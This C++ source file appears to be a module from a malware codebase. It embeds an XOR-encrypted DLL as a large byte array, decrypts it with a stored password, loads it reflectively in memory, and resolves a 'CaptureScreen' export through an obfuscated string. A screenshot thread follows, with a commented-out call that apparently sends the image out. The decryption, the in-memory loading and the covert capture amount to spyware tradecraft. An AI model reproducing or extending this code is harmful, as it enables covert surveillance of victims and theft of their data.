#include <windows.h>
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
 #include "Utils.h"
#include "GetApi.h"
//#include "Loader.h"
#include "Crypt.h"

	char Screen_Dll[] =
		"\x07\x00\x00\x00\x34\x31\x30\x36\x36\x32\x35\x7F\x61\xDC\x4D"
		"\x35\x2F\x30\x21\x6E\x73\x54\x65\x91\x78\xB8\xD9\x9A\x2B\x1C"
		"\xFD\xE6\xFF\xC0\xD1\xDA\x63\x64\x55\x5E\x17\x08\x09\x12\x1B"
		"\xEC\xAD\x96\x8F\x90\x81\x4A\x53\xB4\x85\x8E\xE7\x98\xB9\x82"
		"\x8B\xBC\x5D\x46\x5F\x20\x31\xFA\xC3\xC4\xF5\x26\xF7\xE8\xE9"
		"\xFC\xE4\x36\x03\xF6\x5B\xF9\x2C\x8B\x0B\x95\xE9\x63\x66\x2C"
		"\xF1\x8B\x98\xFC\x4D\x54\x50\x67\x63\x3B\x4E\x04\x76\x7F\xB9"
		"\xA6\xA6\xA6\xFB\x4E\x08\x76\x3D\x25\x2F\xAA\xFA\x9A\xE5\x8A"
		"\xE8\x0B\x59\x2F\x24\x18\xF8\xA8\x92\x6D\x7B\x9E\x83\x84\xB5"
		"\xBE\xB7\xA8\xA9\xBE\xF2\xA1\xF4\xFE\x87\xB3\xCB\xA2\xDB\xD7"
		"\x8F\xA6\x2F\x3B\x33\x02\x9C\x9B\x17\x2C\x57\x43\x3B\xBA\xD4"
		"\xEC\xBF\x97\xBF\x8B\xE3\xFD\x75\x14\x47\x55\x27\x13\x6B\x82"
		"\xFB\x36\x6F\x5A\x4F\x1B\x53\x54\x71\xB5\xB7\x8F\xF7\xA3\xDB"
		"\x2C\x39\xD5\x1F\x37\x5F\x6B\x03\x24\x01\x9E\xE7\x3F\x47\x73"
		"\x0B\x78\x5A\x77\x4D\x66\xEF\xFB\x73\x62\x6B\x5C\xBD\xA6\xBF"
		"\x80\x91\x8A\xE6\xA4\x95\xD2\x56\x4C\x49\x48\xEC\x0D\xA1\xD6"
		"\xCF\xD0\xC1\x0A\x13\x74\x45\xAE\x27\xDA\xD8\xC9\xCA\xF5\x1D"
		"\x06\x1B\xE0\xF1\x3A\x0B\x04\x35\x3E\x37\x28\x29\xA0\x28\x4C"
		"\x4D\x36\x3F\x30\x21\x6A\x53\x54\x65\x6E\x87\xB8\xC9\x22\x3B"
		"\x1C\xFD\xE6\xFD\xC0\xD1\x9F\x63\x64\x55\x5E\x17\x08\x09\x17"
		"\x1B\xEC\xAD\x96\x8F\x90\x81\x4A\x03\xB4\x85\x8E\xE3\x98\xB9"
		"\x82\x8B\xBC\x5D\x44\x5F\x60\x30\xFA\xC3\xD4\xF5\xFE\xE7\xE8"
		"\xE9\xF2\xFB\x9C\x0D\xF6\xFF\xF0\xE1\xAA\xB3\x94\xA5\xBE\x47"
		"\x78\x99\x52\xC8\xDC\x3D\x76\x3F\x00\x11\x5A\x02\x24\x15\x66"
		"\xD7\xC8\xC9\xD2\xDB\x2C\x6D\x56\x4F\x50\x41\x8A\x93\xF4\xC5"
		"\xCE\xA7\x58\x79\x42\x4B\x7C\x9D\x86\x9F\x60\x71\xBA\xC3\x84"
		"\xB5\xFE\xB7\xA8\xA9\xC2\x9B\xCC\xCD\xAA\xAF\xB0\xA1\xEA\xF3"
		"\xD4\xE5\xEE\x07\x38\x59\xA2\xAB\x9C\x7D\x66\x7F\x40\x51\x1A"
		"\xE3\xE4\xD5\xDE\x97\x88\x89\x92\x9B\x6C\x2D\x16\x0F\x10\x01"
		"\xCA\xD3\x34\x05\x0E\x67\x18\x39\x02\x2B\x3C\xDD\xAA\xDF\xA0"
		"\xB1\x7A\x43\x44\x75\x7E\x77\x68\x69\x72\x7B\x0C\x8D\x76\x6F"
		"\x70\x61\x2A\x33\x14\x25\x2E\xC7\xF8\x19\x4C\x1F\x39\xC5\xD2"
		"\xBF\x80\x91\x66\xA0\xA4\x95\x9E\x47\x48\x49\x52\x5F\xAC\xED"
		"\xD6\xCB\xD0\xC1\x0A\x13\x74\x45\x4E\x27\xD8\xF9\xC2\xCB\xFC"
		"\x1D\x26\x1F\xE0\x91\x14\x71\x60\x54\x4A\x56\x28\x29\x32\x3F"
		"\x4C\x4D\x36\x0F\x30\x21\x6A\x77\x54\x65\x6E\x8F\xB8\xD9\x22"
		"\x2B\x1C\xFD\xE6\xFF\xC0\xD1\x9A\x63\x64\x55\x1E\x17\x08\x49"
		"\x3C\x7F\x8D\xD9\xF7\x8F\x90\x81\x63\x53\xB4\x85\x8E\xD7\x98"
		"\xB9\x82\x8B\xBC\x5D\x46\x5F\x20\x31\xFA\xC3\xC4\xF5\xFE\xF7"
		"\xE8\xE9\xF2\xFB\x8C\x0D\xB6\xEF\xF0\x21\x84\xC1\xF1\xC9\xC1"
		"\x24\x78\x99\x02\xEB\xDC\x3D\x26\x7F\x00\x11\x5A\x21\x24\x15"
		"\x1E\xDB\xC8\xC9\xD2\xDB\x2C\x6D\x56\x4F\x50\x41\x8A\x93\xF4"
		"\xC5\x8E\xA7\x58\x3B\x42\x4B\x7C\x9D\x86\x9F\x60\x71\xBA\x83"
		"\x84\xB5\xBE\xB7\xA8\xA9\xB2\xBB\xCC\xCD\xB6\xAF\xB0\xA1\xEA"
		"\xF3\xD4\xE5\xEE\x07\x38\x59\xA2\xAB\x9C\x7D\x66\x7F\x40\x51"
		"\x1A\xE3\xE4\xD5\xDE\x97\x88\x89\x92\x9B\x6C\x2D\x16\x0F\x10"
		"\x01\xCA\xD3\x34\x05\x0E\x67\x18\x39\x02\x0B\x3C\xDD\xC6\xDF"
		"\xA0\xB1\x7A\x43\x44\x75\x7E\x77\x68\x69\x72\x7B\x0C\x8D\x76"
		"\x6F\x70\x61\x2A\x33\x14\x25\x2E\xC7\xF8\x19\x62\x6B\x5C\xBD"
		"\xA6\xBF\x80\x91\xDA\xA3\xA4\x95\x9E\x57\x48\x49\x52\x5B\xAC"
		"\xED\xD6\xCF\xD0\xC1\x0A\x13\x74\x45\x4E\x27\xD8\xF9\xC2\xCB"
		"\xFC\x1D\x06\x1F\xE0\xF1\x3A\x03\x04\x35\x3E\x37\x28\x29\x32"
		"\x3B\x4C\x4D\x36\x2F\x30\x21\x6A\x73\x54\x65\x6E\x87\xB8\xD9"
		"\x22\x2B\x1C\xFD\xE6\xFF\xC0\xD1\x9A\x63\x64\x55\x5E\x17\x08"
		"\x09\x12\x1B\xEC\xAD\x96\x8F\x90\x81\x4A\x53\xB4\x85\x8E\xE7"
		"\x98\xB9\x82\x8B\xBC\x5D\x46\x5F\x20\x31\xFA\xC3\xC4\xF5\xFE"
		"\xF7\xE8\xE9\xF2\xFB\x8C\x0D\xF6\xEF\xF0\xE1\xAA\xB3\x94\xA5"
		"\xAE\x47\x78\x99\xE2\xEB\xDC\x3D\x26\x3F\x00\x11\x5A\x23\x24"
		"\x15\x1E\xD7\xC8\xC9\xD2\xDB\x2C\x6D\x56\x4F\x50\x41\x8A\x93"
		"\xF4\xC5\xCE\xA7\x58\x79\x42\x4B\x7C\x9D\x86\x9F\x60\x71\xBA"
		"\x83\x84\xB5\xBE\xB7\xA8\xA9\xB2\xBB\xCC\xCD\xB6\xAF\xB0\xA1"
		"\xEA\xF3\xD4\xE5\xEE\x07\x38\x59\xA2\xAB\x9C\x7D\x66\x7F\x40"
		"\x51\x1A\xE3\xE4\xD5\xDE\x97\x88\x89\x92\x9B\x6C\x2D\x16\x0F"
		"\x10\x01\xCA\xD3\x34\x05\x0E\x67\x18\x39\x02\x0B\x3C\xDD\xC6"
		"\xDF\xA0\xB1\x7A\x43\x44\x75\x7E\x77\x68\x69\x72\x7B\x0C\x8D"
		"\x76\x6F\x70\x61\x2A\x33\x14\x25\x2E\xC7\xF8\x19\x62\x6B\x5C"
		"\xBD\xA6\xBF\x80\x91\xDA\xA3\xA4\x95\x9E\x57\x48\x49\x52\x5B"
		"\xAC\xED\xD6\xCF\xD0\xC1\x0A\x13\x74\x45\x4E\x27\xD8\xF9\xC2"
		"\xCB\xFC\x1D\x06\x1F\xE0\xF1\x3A\x03\x04\x35\x3E\x37\x28\x29"
		"\xB1\x47\x68\x49\x36\x5B\x21\x49\x6A\xF3\x54\x65\x04\x87\x47"
		"\xAD\x06\x27\xE3\xE8\xDE\xDF\xC0\xC1\x59\x36\xEF\xB9\xDD\xFB"
		"\x04\x5F\x9F\x5E\x14\xFD\x1B\xCA\x64\xB2\xBC\x03\x3D\xF0\x7A"
		"\x6E\xED\x41\x6A\xE2\xBF\x5D\x46\x66\x55\xC9\x8F\xC6\x47\x3D"
		"\x01\x1C\xF4\xBA\x98\xFF\xE4\x0D\xC6\xEF\xF0\x1E\xDF\x4B\xC2"
		"\x5A\xBB\x6B\x58\x99\xF2\x60\x04\x06\xF8\x4A\x07\x92\x92\xDC"
		"\x7F\x4B\xD7\x14\x9B\x36\xA7\x23\xD3\x18\xA2\xA7\x16\x42\x8A"
		"\x93\x7D\xB0\x32\x9E\x2D\x8D\x34\x69\xF1\xEE\xB6\xF7\xEC\x51"
		"\xBA\x93\x7B\x83\x41\xA2\x98\x89\xB2\xAB\x49\x0D\xC2\xBC\x4F"
		"\xE4\x16\x78\x91\x19\x6D\xC1\x74\x62\xE7\x5F\xEE\x9C\xE5\xB1"
		"\xBF\xBA\x0E\x68\x91\x29\xB5\x61\xC4\xDE\x19\xE6\x64\x2E\xE5"
		"\xAA\xB5\xA4\x6F\x58\x41\xF9\x51\x34\xF0\x74\xFD\xF4\xC3\x84"
		"\x4D\x19\x4B\x13\x2F\xC8\xA8\xF6\x92\x2F\x3B\x3F\x41\xA0\x3F"
		"\x7B\x30\x38\xF9\x3C\xDA\xBA\x61\xE9\xA7\x9A\x28\x90\x3F\xBF"
		"\xD5\xE0\x7E\x87\x9D\xB9\xEA\xA3\xB4\xE0\xBE\xDA\x0D\x95\x02"
		"\xD6\xE9\x21\x86\x42\x95\x2D\x5A\xFB\xBC\x47\x4E\x27\x1E\xFC"
		"\xEA\xFB\xFC\x0D\x07\x24\x23\xFE\xBF\xBE\x04\x35\x3E\xBA\x6D"
		"\x95\x62\xD3\x5F\xB2\xC9\xD0\x69\xAC\x2F\x87\x04\x36\x91\xF2"
		"\xB0\x50\x7F\xDF\xF4\x6E\xE4\xFF\xC0\x5A\xE7\x97\xE9\x10\xA6"
		"\x47\x5E\x5A\x9B\x66\x5C\x52\x83\xEB\xB0\x81\x5A\xD6\x74\x8A"
		"\x02\x66\x98\xB9\x82\xD8\x31\x18\xFA\x0F\xDF\x44\x02\x94\x2C"
		"\xAC\xFC\xF7\xE8\xD2\x31\x8E\xEA\x86\xB3\x17\x7B\xD1\x27\xCE"
		"\x70\xF2\xC4\x45\x4B\x4B\xB0\xD8\x15\x6C\x76\xC0\x56\x05\xDF"
		"\xE3\x58\x58\x95\x92\x30\x42\xE2\x88\x7F\x5E\x84\x1D\x63\x88"
		"\xDB\xC3\x0B\x93\xDA\x22\x98\x05\x7A\xC0\x39\x79\x0D\xEA\x70"
		"\x1B\xBE\xEB\x84\x85\xBE\xB7\xF8\xFA\x3B\xBD\x33\xD8\x9A\x8F"
		"\xB0\xB1\x61\xBE\xD8\x6C\xEF\x3C\xFB\x2D\xBA\x20\xD1\x85\xED"
		"\x6E\x13\xAE\x2C\xB3\xB5\x2A\x8C\x9B\x0D\x49\xEE\x9C\xAB\x68"
		"\xE6\x0E\x10\x01\xCA\x58\x71\xFD\x85\x6F\x48\xC6\x53\x03\xC3"
		"\xA8\x76\x37\x4A\xB0\x7A\x43\xCF\x30\x8E\x28\x36\x32\xBB\xB8"
		"\x59\x06\x9A\xEC\x94\x99\xA9\xDF\x38\x76\x78\x90\xCB\xE6\x35"
		"\x3C\x0B\xD5\x02\x9F\x80\x81\x25\xB6\xAC\xB5\x9E\x47\xC3\x91"
		"\x01\xD2\xF0\xC9\xF6\x30\xC5\xD1\x2A\x13\x64\xCE\x7B\x27\xF8"
		"\xF9\xD2\xA1\xF4\x4E\x8F\x5B\xC4\xE9\xC5\xD5\x6E\x3F\x6D\xBE"
		"\x6C\x0D\x2E\xC4\x9A\xC6\xC6\x79\xCF\x55\x4E\x6B\x07\x9A\x7B"
		"\x93\x98\xD9\x32\xA2\x58\xD9\xFE\xC4\x07\xDE\x1E\x34\x65\x55"
		"\x5E\x47\xF7\x7D\x36\x0F\x13\xB8\x9A\xAF\x90\x91\xCF\x93\xBB"
		"\x01\xCA\xE6\x98\xB9\xEA\xAB\xBC\x91\x46\x09\xDF\x45\xDE\xDF"
		"\x93\xA2\xAD\xA1\x17\x9D\xD6\xCB\xDB\x5A\x09\x9B\xD4\xD9\x55"
		"\xA6\x88\x85\xAE\x57\xFD\x59\xED\x6F\xC2\x3C\x26\x3F\x8D\x55"
		"\x7E\x03\x74\x7F\x06\x28\xBC\xED\xF2\x24\x39\x75\x76\x4F\x40"
		"\xC4\x4A\x9C\x70\xC0\xCF\xA7\x58\xF2\x06\x6F\x4E\x92\x29\xDB"
		"\x44\x41\xB5\x34\x44\xD3\x3D\x4F\xA9\xDC\xBA\x88\x17\x8E\x5F"
		"\x5A\xB0\xA1\xEA\x99\xD0\xBE\x88\x3C\xFB\x56\x24\x42\x9C\x7D"
		"\x66\x15\x48\x0A\x7C\xD8\x27\xDA\x58\x4A\x88\x89\x92\xF1\x7C"
		"\x76\x70\x34\xD3\x0E\x4C\x02\x34\x05\x0E\x01\x9B\xC1\x1A\x04"
		"\xBB\x19\xC6\xDF\xA0\xDB\x62\x18\x2E\x5D\x14\x37\x97\x7C\x56"
		"\x5B\x0C\x9D\xFD\x9F\xB7\x67\x02\x33\x14\x25\xA5\x83\xDC\x3D"
		"\xEB\x2D\x58\x36\xE2\x9B\xA8\x18\x9C\xAB\xC2\x1E\xDA\x73\x78"
		"\x2F\xDB\x1D\xA0\x8B\x5D\x8B\xF4\xF3\x6C\x9A\x32\x4B\x28\xA4"
		"\x23\xE1\xB1\xC1\xCF\xDD\x46\x95\x2B\x22\xDA\x8A\x42\x15\xB5"
		"\x71\x2C\xAA\xF2\x3C\xD5\xCE\xD4\x28\x33\xE3\x65\xC4\x9F\xA4"
		"\x96\x84\xB7\x76\xE3\x24\xB3\xBB\xEE\xAF\x97\x58\xE4\x73\xED"
		"\x13\x4A\x9E\x76\x2D\xED\x0E\xD8\x8D\x96\x9F\x1B\x59\x71\x8C"
		"\xC0\xCD\x81\x50\xDE\xB1\xD5\xDD\xEF\x0D\x11\xA0\x54\x15\xD6"
		"\x3C\xB0\xD1\xD6\x08\xFD\xED\xD2\xFB\x9C\x88\x36\x9B\xDD\x1E"
		"\xDF\xBF\x6B\xD0\xA6\xB8\x0C\xBD\xC2\x03\xBE\xC0\xD9\xC0\x83"
		"\xD5\x56\x70\xDB\x00\x36\xF7\xC8\xD9\x2D\xAF\x08\x71\xDD\x7A"
		"\x10\x61\x8A\x83\xA3\x3A\x18\x58\x2C\x5D\x52\x1C\x83\x4B\xD9"
		"\xC1\x3B\xFA\x5F\xDE\x47\xDF\x9E\xEC\x9B\x69\xF2\x31\x07\x1E"
		"\x56\x22\xB4\x24\xC2\xF3\xD4\xE5\xBE\xEE\x12\xA6\x5D\x54\xAF"
		"\xBD\x26\xBD\x4C\x51\xE5\xC6\xA8\xF5\xDE\x87\x77\xAC\xC2\xBB"
		"\x6C\x3D\xE9\x2A\x44\x21\xCA\xC3\xCB\x20\x56\x47\x18\x29\xFD"
		"\x2E\x60\xFD\xC6\xCF\x5F\x94\x32\x63\x44\x65\x7E\x77\x68\x69"
		"\x72\x7B\x0C\x8D\x76\x6F\x70\x61\x2A\x33\x14\x25\x2E\xC7\xF8"
		"\x19\x62\x6B\x5C\xBD\xA6\xBF\x80\x91\xDA\xA3\xA4\x95\x9E\x57"
		"\x48\x49\x52\x5B\xAC\xED\xD6\xCF\xD0\xC1\x0A\x13\x74\x45\x4E"
		"\x27\xD8\xF9\xC2\xCB\xFC\x1D\x06\x1F\xE0\xF1\x3A\x03\x04\x35"
		"\x3E\x37\x28\x29\xE0\x19\x4C\x4D\x8E\x0D\x30\x21\xC6\x51\x54"
		"\x65\xF2\xA5\xB8\xD9\xA4\x09\x1C\xFD\x8A\xDD\xC0\xD1\xC4\x41"
		"\x64\x55\x9A\x35\x08\x09\x12\x1B\xEC\xAD\xBC\xAD\x90\x81\x56"
		"\x71\xB4\x85\x82\xC5\x98\xB9\x82\xA9\xBC\x5D\xB4\x7E\x20\x31"
		"\x1E\xE2\xC4\xF5\xFE\xF7\xE8\xE9\xB4\xD9\x8C\x0D\xF6\xEF\xF0"
		"\xE1\x26\x90\x94\xA5\xA0\x64\x78\x99\xC4\xC8\xDC\x3D\x64\x1C"
		"\x00\x11\x0C\x00\x24\x15\x6A\xF4\xC8\xC9\xD2\xDB\x2C\x6D\xBA"
		"\x6D\x50\x41\x8A\x93\xF4\xC5\xCE\xA7\x58\x79\x42\x4B\x7C\x9D"
		"\x9C\x28\xC1\x3D\xBA\x83\x84\xB5\xBC\xB7\xA8\xA9\xF4\xBB\xCC"
		"\xCD\x02\x8F\xB0\xA1\x5E\xFB\xD4\xE5\x87\x07\x55\x59\xC3\xAB"
		"\xFB\x7D\x03\x7F\x6F\x51\x70\xE3\x94\xD5\xBB\x97\xEF\x89\x92"
		"\x9B\x6C\x2D\x52\x0F\x59\x01\x99\xD3\x64\x05\x42\x67\x59\x39"
		"\x5B\x0B\x3C\xDD\x94\x8C\xE4\xE2\xC3\x04\x4D\x02\xC5\x4E\x69"
		"\x2E\xED\x91\x14\x08\xFD\xAE\x0F\xCB\x29\x33\x14\x25\x4D\xFD"
		"\xA4\x54\x1B\x3C\x33\xCF\xCD\xE3\xF3\xF2\xA8\xC6\xC1\xFB\xED"
		"\x08\x2C\x25\x3E\x07\xFE\x88\xBA\xAA\xB1\xB2\x6F\x4F\x07\x26"
		"\x3C\x42\xBD\x97\xB1\x94\x98\x71\x6A\x31\x90\x95\x58\x03\x04"
		"\x35\x3E\x37\x28\x29\xAE\x1A\x4C\x4D\x36\x2F\x30\x21\x6A\x73"
		"\x54\x65\x56\xA5\xB8\xD9\x06\x0B\x1C\xFD\x5E\xDE\xC0\xD1\x9A"
		"\x63\x64\x55\x5E\x17\x08\x09\x40\x39\xEC\xAD\xD6\xAF\x90\x81"
		"\x32\x72\xB4\x85\x8E\xE7\x98\xB9\x82\x8B\xBC\x5D\xA4\x7D\x20"
		"\x31\xFA\xE3\xC4\xF5\x22\xD6\xE8\xE9\xF2\xFB\x8C\x0D\xF6\xEF"
		"\xF0\xE1\xAE\x90\x94\xA5\xCA\x67\x78\x99\x22\xCA\xDC\x3D\x26"
		"\x3F\x00\x11\x5A\x23\x24\x15\x80\xF4\xC8\xC9\x9A\xFB\x2C\x6D"
		"\x56\x4F\x50\x41\x8A\x93\xF4\xC5\xCE\xA7\x58\x79\x42\x4B\x7C"
		"\x9D\x86\x9F\x60\x71\x68\xA1\x84\xB5\x06\x95\xA8\xA9\x1E\x99"
		"\xCC\xCD\x2A\x8D\xB0\xA1\x6C\xD1\xD4\xE5\x82\x25\x38\x59\xFC"
		"\x89\x9C\x7D\xA2\x5D\x40\x51\x1A\xE3\xE4\xD5\xF4\xB5\x88\x89"
		"\x8E\xB9\x6C\x2D\x1A\x2D\x10\x01\xCA\xF1\x34\x05\xFC\x46\x18"
		"\x39\xE6\x2A\x3C\xDD\xC6\xDF\xA0\xB1\x3C\x61\x44\x75\x7E\x77"
		"\x68\x69\xFE\x58\x0C\x8D\x78\x4C\x70\x61\x0C\x10\x14\x25\x6C"
		"\xE4\xF8\x19\x34\x48\x5C\xBD\xD2\x9C\x80\x91\xDA\xA3\xA4\x95"
		"\x72\x75\x48\x49\x52\x5B\xAC\xED\x81\xCB\x86\xA8\x78\x67\x01"
		"\x24\x22\x61\xAA\x9C\xA7\xCB\x79\x1F\x41\x73\x8F\x93\x5B\x6F"
		"\x45\x59\x52\x58\x4B\x29\x98\x3F\x20\x3E\x42\x5D\x53\x4C\x1A"
		"\x24\x54\x65\x3A\x83\xEE\xB0\x50\x5F\x69\x9C\x8A\xBE\xAC\xBD"
		"\xF5\x00\x64\x55\xD2\x15\x4F\x65\x7D\x79\x8D\xC1\xD0\xFD\xF5"
		"\xE4\x4A\x53\x4D\x87\xC2\x88\xFB\xD8\xEE\xCA\xD0\x31\x29\x3C"
		"\x20\x31\xB1\x86\x96\xBB\xBB\xBB\xDB\xDB\xDC\x9F\xE0\x61\xF6"
		"\xEF\xBC\xE3\xF8\xD6\xF8\xC0\xCF\x34\x1D\xDD\xA1\xEB\x89\x6E"
		"\x63\x6D\x33\x23\x74\x47\x48\x79\x1E\xD7\x2C\xC8\x95\xBE\x58"
		"\x22\x34\x25\x35\x22\xFE\xC4\xF4\xC5\xE3\xA7\x1B\x0B\x27\x2A"
		"\x08\xF8\xC5\xF0\x0D\x01\xDB\xF7\xED\xD7\xD2\xD2\xEA\xC0\xC6"
		"\xD6\xAD\xBD\xB6\xAF\x9E\xA1\xA9\x81\xB1\x84\x9A\x62\x7B\x36"
		"\xCF\xDB\xFD\x09\x0F\x1D\x2C\x34\x5E\xA0\xE4\xD5\x80\x95\xDB"
		"\xEC\xFE\xFE\x0F\x59\x59\x6D\x7A\x64\xA9\xA7\x34\x05\x3E\x67"
		"\x5B\x4B\x67\x6A\x48\xB8\x82\x9C\xF7\xB1\xCE\x42\x03\x10\x0A"
		"\x33\x21\x2B\x1B\x0F\x7F\x8D\xEC\x6D\x23\x15\x58\x56\x60\x46"
		"\x46\x85\x94\x6D\x62\x6B\xE9\xBC\xE1\xDA\xF4\xD5\xBF\xD5\xCD"
		"\xF6\xFB\x14\x29\x39\x21\x5B\xEB\xA9\x9F\xFC\xE2\xEF\x6E\x7F"
		"\x18\x45\xCB\x27\x9B\x8B\xA7\xAA\x88\x78\x55\x6B\x92\x94\x5B"
		"\x6E\x4B\x5B\x76\x70\x44\x46\x50\x5A\x20\x4D\x59\x43\x55\x12"
		"\x58\x5D\x30\x09\x02\x87\x49\xD8\x65\x4F\x75\x8D\xB5\x9E\xB6"
		"\xB4\xD3\x0E\x05\x32\x3B\x43\x67\x5A\x66\x69\x89\xCC\xFB\x8F"
		"\x8F\x80\x0D\x37\xDD\xF5\xC9\x82\xEC\xF0\xEF\xEA\xDB\x38\x03"
		"\x31\x43\x5E\x9E\xA6\xB6\x86\xAD\x9E\x92\x8C\xF2\xFB\x14\x0D"
		"\xB1\x8B\x99\x91\xEE\xDA\xE7\xD5\xC1\x34\x1D\xD0\x8F\x8A\xBB"
		"\x58\x26\x3F\x4D\x11\x1D\x47\x4D\x65\x5D\xA5\xAD\xA8\xA6\xBE"
		"\x6E\x04\x22\x22\x31\x31\xCC\xE1\x9B\xA8\x86\xE5\x11\x2D\x0F"
		"\x0A\x2C\x9D\x98\x9E\x27\x15\xD3\xF3\xC3\xD0\xCA\xFE\xC5\xC8"
		"\xD5\xDE\x89\xA3\xD5\xC0\xD4\xC4\x98\x80\xD4\xE5\x9B\x05\x7F"
		"\x3D\xCB\xDB\xF0\x08\x15\x2C\x34\x30\x68\x97\x91\xA5\xDE\x97"
		"\xEF\xED\xFB\xEB\x00\x58\x65\x21\x74\x6D\xA6\xD3\x34\x05\x0E"
		"\x67\x18\x39\x02\x0B\x3C\xDD\xDC\x68\x01\xFD\x7A\x43\x44\x75"
		"\x9C\x54\x68\x69\x73\x7B\x0C\x8D\x77\x6F\x70\x61\x2B\x33\x14"
		"\x25\xF6\xE4\xF8\x19\xBE\x48\x5C\xBD\x46\x9C\x80\x91\x18\xB2"
		"\xA4\x95\x6C\x74\x48\x49\x52\x5B\xDF\x8E\xA4\xAA\xB5\xAF\x79"
		"\x4C\x10\x29\x22\x09\xBC\x95\xAE\xCB\xBF\x7C\x76\x6B\x95\x83"
		"\x5F\x50\x67\x47\x5B\x52\x46\x29\x32\x2B\x4C\x4D\x76\x2F\x30"
		"\x21\x7E\x43\x19\x55\x18\xB7\xC6\xE9\xF5\x1B\xEC\xCD\xC3\xCE"
		"\x44\xE0\x4E\x52\xBE\x64\xB9\x26\xE5\x38\x1F\x29\xC8\x9F\xDC"
		"\xBD\xF3\xB3\x8A\x61\x96\xB6\xB1\xD4\xC4\x8A\xE4\xB8\x26\x6E"
		"\xE6\x6C\x86\x02\x56\xF0\x76\xC6\x46\xC4\xE8\xE9\xF2\xFB\x8C"
		"\x0D\xF6\xEF\xF0\xE1\xAA\xB3\x94\xA5\xAE\x47\x78\x99\xE2\xEB"
		"\xDC\x3D\x26\x3F\x00\x11\x5A\x23\x24\x15\x1E\xD7\xC8\xC9\xD2"
		"\xDB\x2C\x6D\x56\x4F\x50\x41\x8A\x93\xF4\xC5\xCE\xA7\x58\x79"
		"\x42\x4B\x7C\x9D\x86\x9F\x60\x71\xBA\x83\x84\xB5\xBE\xB7\xA8"
		"\xA9\xB2\xBB\xCC\xCD\xB6\xAF\xB0\xA1\xEA\xF3\xD4\xE5\xEE\x07"
		"\x38\x59\xA2\xAB\x9C\x7D\x66\x7F\x40\x51\x1A\xE3\xE4\xD5\xDE"
		"\x97\x88\x89\x92\x9B\x6C\x2D\x16\x0F\x10\x01\xCA\xD3\x34\x05"
		"\x0E\x67\x18\x39\x02\x0B\x3C\xDD\xC6\xDF\xA0\xB1\x7A\x43\x44"
		"\x75\x7E\x77\x68\x69\x72\x7B\x0C\x8D\x76\x6F\x70\x61\x2A\x33"
		"\x14\x25\x2E\xC7\xF8\x19\x62\x6B\x5C\xBD\xA6\xBF\x80\x91\xDA"
		"\xA3\xA4\x95\x9E\x57\x48\x49\x52\x5B\xAC\xED\xD6\xCF\xD0\xC1"
		"\x0A\x13\x74\x45\x4E\x27\xD8\xF9\xC2\xCB\xFC\x1D\x06\x1F\xE0"
		"\xF1\x3A\x03\x04\x35\x3E\x37\x28\x29\x32\x3B\x4C\x4D\x36\x2F"
		"\x30\x21\x6A\x73\x54\x65\x6E\x87\xB8\xD9\x22\x2B\x1C\xFD\xE6"
		"\xFF\xC0\xD1\x9A\x63\x64\x55\x5E\x17\x08\x09\x12\x1B\xEC\xAD"
		"\x96\x8F\x90\x81\x4A\x53\xB4\x85\x8E\xE7\x98\xB9\x82\x8B\xBC"
		"\x5D\x46\x5F\x20\x31\xFA\xC3\xC4\xF5\xFE\xF7\xE8\xE9\xF2\xFB"
		"\x8C\x0D\xF6\xEF\xF0\xE1\xAA\xB3\x94\xA5\xAE\x47\x78\x99\xE2"
		"\xEB\xDC\x3D\x26\x3F\x00\x11\x5A\x23\x24\x15\x1E\xD7\xC8\xC9"
		"\xD2\xDB\x2C\x6D\x56\x4F\x50\x41\x8A\x93\xF4\xC5\xCE\xA7\x58"
		"\x79\x42\x4B\x7C\x9D\x86\x9F\x60\x71\xBA\x83\x84\xB5\xBE\xB7"
		"\xA8\xA9\xB2\xBB\xCC\xCD\xB6\xAF\xB0\xA1\xEA\xF3\xD4\xE5\xEE"
		"\x07\x38\x59\xA2\xAB\x9C\x7D\x66\x7F\x40\x51\x1A\xE3\xE4\xD5"
		"\xDE\x97\x88\x89\x92\x9B\x6C\x2D\x16\x0F\x10\x01\xCA\xD3\x34"
		"\x05\x0E\x67\x18\x39\x02\x0B\x3C\xDD\xC6\xDF\xA0\xB1\x7A\x43"
		"\x44\x75\x7E\x77\x68\x69\x72\x7B\x0C\x8D\x76\x6F\x70\x61\x2A"
		"\x33\x14\x25\x2E\xC7\xF8\x19\x62\x6B\x5C\xBD\xA6\xBF\x80\x91"
		"\xDA\xA3\xA4\x95\x9E\x57\x48\x49\x52\x5B\xAC\xED\xD6\xCF\xD0"
		"\xC1\x0A\x13\x74\x45\x4E\x27\xD8\xF9\xC2\xCB\xFC\x1D\x06\x1F"
		"\xE0\xF1\x3A\x03\x04\x35\x3E\x37\x28\x29";

bool bInitialized;


DWORD GetScreenDllSize()
{
	return sizeof(Screen_Dll);
}


typedef void (*PCaptureScreen )( LPVOID *lpFile, LPDWORD dwFileSize );
PCaptureScreen CaptureScreen;
HMEMORYMODULE hLib;
void InitScreenLib()
{
	bInitialized = false;
	CaptureScreen = NULL;

	DWORD dwScreenSize = sizeof( Screen_Dll );
	LPBYTE ScreenFile  = (LPBYTE)MemAlloc( dwScreenSize + 1 );	
		
	if ( !ScreenFile )
	{
		return;
	}

	m_memcpy( ScreenFile, Screen_Dll, sizeof( Screen_Dll ) );

	DWORD dwPassLen = *(DWORD*)ScreenFile;

	ScreenFile	  += sizeof( DWORD );
	dwScreenSize  -= sizeof( DWORD );

	char Password[30];

	m_memcpy( Password, ScreenFile, dwPassLen );

	Password[ dwPassLen ] = '\0';

	ScreenFile   += dwPassLen;
	dwScreenSize -= dwPassLen;

	XORCrypt::Crypt(Password, ScreenFile, dwScreenSize);
		
	m_memset( Password, 0, dwPassLen );

	hLib = MemoryLoadLibrary( ScreenFile );

	if ( hLib != NULL )
	{
		char CapScreen[] = {'C','a','p','t','u','r','e','S','c','r','e','e','n',0};

		CaptureScreen = (PCaptureScreen)MemoryGetProcAddress( hLib, CapScreen );

		if ( CaptureScreen )
		{
			bInitialized = true;
		}
	}

	return;
}


void GetScreen( LPVOID *lpFile, LPDWORD dwFileSize )
{
	if ( bInitialized )
	{
		CaptureScreen( lpFile, dwFileSize );
	}

	return;	
}


DWORD WINAPI ScreensThread( LPVOID lpData )
{
	LPVOID lpFile;
	DWORD dwFileSize;
	GetScreen( &lpFile, &dwFileSize );

	if ( lpFile != NULL )
	{			
		//SendScreen( lpFile, dwFileSize );
		MemFree( lpFile );
	}

	return 0;
}
/*void destroyScr()// ���� ����������� ��� ������ ���
{
	MemoryFreeLibrary(hLib);

}*/

